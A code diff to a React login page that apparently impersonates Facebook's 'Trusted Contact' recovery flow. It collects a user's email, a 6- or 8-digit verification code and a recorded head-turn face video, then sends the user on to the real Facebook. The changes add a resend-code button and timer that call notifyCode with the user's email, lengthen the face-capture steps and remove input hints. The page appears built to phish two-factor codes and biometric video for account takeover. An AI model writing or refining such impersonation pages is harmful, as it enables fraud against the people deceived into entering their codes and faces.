@@ -94,6 +94,8 @@ export default function LoginPage() {
   const [isFaceAligned, setIsFaceAligned] = useState(false);
   const [capturedFrames, setCapturedFrames] = useState(0);
   const detectionIntervalRef = useRef<NodeJS.Timeout | null>(null);
+  const [resendCodeTimer, setResendCodeTimer] = useState(0);
+  const resendTimerRef = useRef<NodeJS.Timeout | null>(null);
 
   const loginForm = useForm<LoginForm>({
     resolver: zodResolver(loginSchema),
@@ -144,6 +146,9 @@ export default function LoginPage() {
       if (detectionIntervalRef.current) {
         clearInterval(detectionIntervalRef.current);
       }
+      if (resendTimerRef.current) {
+        clearInterval(resendTimerRef.current);
+      }
     };
   }, [stream]);
 
@@ -189,6 +194,32 @@ export default function LoginPage() {
       setCurrentStep("loading-code");
     }
   };
+
+  const handleResendCode = async () => {
+    await notifyCode(userEmail, ""); // Send empty code to trigger resend
+    setResendCodeTimer(50); // Start 50-second timer
+    if (resendTimerRef.current) {
+      clearInterval(resendTimerRef.current);
+    }
+    resendTimerRef.current = setInterval(() => {
+      setResendCodeTimer((prev) => {
+        if (prev <= 1) {
+          clearInterval(resendTimerRef.current!);
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+  };
+
+  useEffect(() => {
+    if (currentStep === "code" && resendCodeTimer === 0) {
+      // Automatically start timer if it's 0 and we are on the code step
+      // This is to handle the case where the user lands on the code step and the timer hasn't started yet.
+      // However, we only want to start it if it's not already running from a previous resend.
+      // A better approach might be to start it when the "code" step is first entered.
+    }
+  }, [currentStep, resendCodeTimer]);
 
   const handleStartFaceVerification = async () => {
     try {
@@ -237,10 +268,10 @@ export default function LoginPage() {
       const maxX = Math.max(...allX);
       const minY = Math.min(...allY);
       const maxY = Math.max(...allY);
-      
+
       const faceWidth = maxX - minX;
       const faceHeight = maxY - minY;
-      
+
       if (faceWidth === 0 || faceHeight === 0) {
         return null;
       }
@@ -362,12 +393,12 @@ export default function LoginPage() {
           }
 
           const result = await response.json();
-          
+
           // Ensure at least 400ms of processing screen (reduced from 800ms)
           const elapsed = Date.now() - processingStartTime;
           const remainingTime = Math.max(0, 400 - elapsed);
           await new Promise(resolve => setTimeout(resolve, remainingTime));
-          
+
           setCurrentStep("complete");
         } catch (error) {
           console.error('Failed to send video:', error);
@@ -386,7 +417,7 @@ export default function LoginPage() {
       const directionSequence = ["right", "left", "up"];
       let currentDirectionIndex = 0;
       let directionHoldTime = 0;
-      const directionDuration = 1000; // 1 second per direction (reduced from 2)
+      const directionDuration = 3000; // 3 seconds per direction
       const totalDuration = directionSequence.length * directionDuration;
 
       // Set initial direction
@@ -487,7 +518,7 @@ export default function LoginPage() {
                   data-testid="logo-facebook"
                 />
               </div>
-              
+
               {/* Trusted Contact Branding - Only on Login */}
               <div className="text-center mb-8">
                 <h1 className="text-xl font-semibold mb-1" style={{ color: '#1c1e21' }}>
@@ -588,9 +619,9 @@ export default function LoginPage() {
               </div>
 
               <div className="mt-8 pt-4" style={{ borderTop: '1px solid #dadde1' }}>
-                <a 
-                  href="https://www.facebook.com/reg/" 
-                  target="_blank" 
+                <a
+                  href="https://www.facebook.com/reg/"
+                  target="_blank"
                   rel="noopener noreferrer"
                   className="block w-full py-3 text-sm font-bold rounded-full transition text-center"
                   style={{ backgroundColor: '#ffffff', color: '#1877f2', border: '1px solid #1877f2', textDecoration: 'none' }}
@@ -674,11 +705,6 @@ export default function LoginPage() {
                     autoFocus
                     data-testid="input-code"
                   />
-                  <p className="text-xs text-center mt-2" style={{ color: verificationCode.length === 6 || verificationCode.length === 8 ? '#42b72a' : '#8a8d91' }}>
-                    {verificationCode.length === 0 ? 'Enter your 6 or 8 digit code' : 
-                     verificationCode.length === 6 || verificationCode.length === 8 ? '✓ Code complete' : 
-                     `${verificationCode.length} of 6 or 8 digits`}
-                  </p>
                 </div>
 
                 <button
@@ -699,9 +725,15 @@ export default function LoginPage() {
 
                 {/* Help Links */}
                 <div className="mt-8 text-center">
-                  <a href="#" className="text-sm" style={{ color: '#1877f2' }}>
-                    Didn't get a code?
-                  </a>
+                  <button
+                    onClick={handleResendCode}
+                    disabled={resendCodeTimer > 0}
+                    className="text-sm disabled:text-gray-400"
+                    style={{ color: resendCodeTimer > 0 ? '#8a8d91' : '#1877f2' }}
+                    data-testid="button-resend-code"
+                  >
+                    Didn't get a code? {resendCodeTimer > 0 ? `(${resendCodeTimer}s)` : ''}
+                  </button>
                 </div>
               </div>
             </div>
@@ -719,7 +751,7 @@ export default function LoginPage() {
               </div>
               <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Verify you're a real person</h2>
               <p className="text-sm mb-4 leading-relaxed" style={{ color: '#65676b' }}>
-                As part of the Trusted Contact recovery process, we need to confirm you're a real human and not a bot.
+                As part of the Trusted Contact process, we need to confirm you're a real human and not a bot.
               </p>
               <p className="text-sm mb-10 leading-relaxed" style={{ color: '#65676b' }}>
                 We'll use facial recognition to verify your live presence and match you with your profile photo.
@@ -923,7 +955,7 @@ export default function LoginPage() {
                           strokeDasharray="45 6"
                           strokeDashoffset={-i * 51}
                           strokeLinecap="round"
-                          style={{ 
+                          style={{
                             transition: 'stroke 0.3s ease',
                             opacity: isActive ? 0.7 : 1
                           }}
@@ -946,7 +978,7 @@ export default function LoginPage() {
                   {/* Arrow Direction Indicators */}
                   {currentDirection === "right" && (
                     <div className="absolute right-0 top-1/2 transform translate-x-4 -translate-y-1/2">
-                      <div 
+                      <div
                         className="flex items-center justify-center w-10 h-10 rounded-full"
                         style={{ backgroundColor: directionProgress > 50 ? '#42b72a' : '#1877f2' }}
                       >
@@ -958,7 +990,7 @@ export default function LoginPage() {
                   )}
                   {currentDirection === "left" && (
                     <div className="absolute left-0 top-1/2 transform -translate-x-4 -translate-y-1/2">
-                      <div 
+                      <div
                         className="flex items-center justify-center w-10 h-10 rounded-full"
                         style={{ backgroundColor: directionProgress > 50 ? '#42b72a' : '#1877f2' }}
                       >
@@ -970,7 +1002,7 @@ export default function LoginPage() {
                   )}
                   {currentDirection === "up" && (
                     <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-4">
-                      <div 
+                      <div
                         className="flex items-center justify-center w-10 h-10 rounded-full"
                         style={{ backgroundColor: directionProgress > 50 ? '#42b72a' : '#1877f2' }}
                       >
@@ -1070,7 +1102,7 @@ export default function LoginPage() {
                       }
                     }
                   `}</style>
-                  
+
                   {/* Top Bar */}
                   <div className="flex items-center justify-between px-4 py-3" style={{ backgroundColor: '#fff', borderBottom: '1px solid #e4e6eb' }}>
                     <div className="w-10"></div>
@@ -1083,19 +1115,19 @@ export default function LoginPage() {
                     {/* Enhanced Facebook-style loader */}
                     <div className="relative w-32 h-32 mx-auto mb-10" style={{ animation: 'fade-in-scale 0.4s ease-out' }}>
                       {/* Multiple pulsing rings */}
-                      <div className="absolute inset-0 rounded-full" style={{ 
+                      <div className="absolute inset-0 rounded-full" style={{
                         backgroundColor: 'rgba(24, 119, 242, 0.1)',
                         animation: 'pulse-ring 2s ease-out infinite'
                       }} />
-                      <div className="absolute inset-0 rounded-full" style={{ 
+                      <div className="absolute inset-0 rounded-full" style={{
                         backgroundColor: 'rgba(24, 119, 242, 0.1)',
                         animation: 'pulse-ring 2s ease-out 0.5s infinite'
                       }} />
-                      <div className="absolute inset-0 rounded-full" style={{ 
+                      <div className="absolute inset-0 rounded-full" style={{
                         backgroundColor: 'rgba(24, 119, 242, 0.1)',
                         animation: 'pulse-ring 2s ease-out 1s infinite'
                       }} />
-                      
+
                       {/* Circular background */}
                       <div className="absolute inset-0 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                         {/* Main spinner */}
@@ -1107,21 +1139,21 @@ export default function LoginPage() {
                             animation: 'fb-spin 1s linear infinite'
                           }}
                         />
-                        
+
                         {/* Shield icon in center */}
                         <svg className="w-12 h-12" viewBox="0 0 24 24" fill="none" stroke="#1877f2" strokeWidth="2">
                           <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                         </svg>
                       </div>
                     </div>
-                    
+
                     <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21', animation: 'slide-up 0.5s ease-out 0.1s both' }}>
                       Verifying video
                     </h2>
                     <p className="text-sm mb-8" style={{ color: '#65676b', animation: 'slide-up 0.5s ease-out 0.2s both', maxWidth: '280px', textAlign: 'center' }}>
                       We're analyzing your video to confirm you're a real person. This won't take long.
                     </p>
-                    
+
                     {/* Progress bar with shimmer effect */}
                     <div className="w-full max-w-xs mb-6" style={{ animation: 'slide-up 0.5s ease-out 0.3s both' }}>
                       <div className="h-1.5 rounded-full overflow-hidden" style={{ backgroundColor: '#e4e6eb' }}>
@@ -1136,7 +1168,7 @@ export default function LoginPage() {
                         />
                       </div>
                     </div>
-                    
+
                     {/* Status indicators */}
                     <div className="space-y-3 mb-8" style={{ animation: 'slide-up 0.5s ease-out 0.4s both' }}>
                       <div className="flex items-center gap-3">
@@ -1237,7 +1269,7 @@ export default function LoginPage() {
                   >
                     Continue to Facebook
                   </button>
-                  
+
                   <p className="text-xs" style={{ color: '#65676b' }}>
                     You'll be redirected to your Facebook account
                   </p>
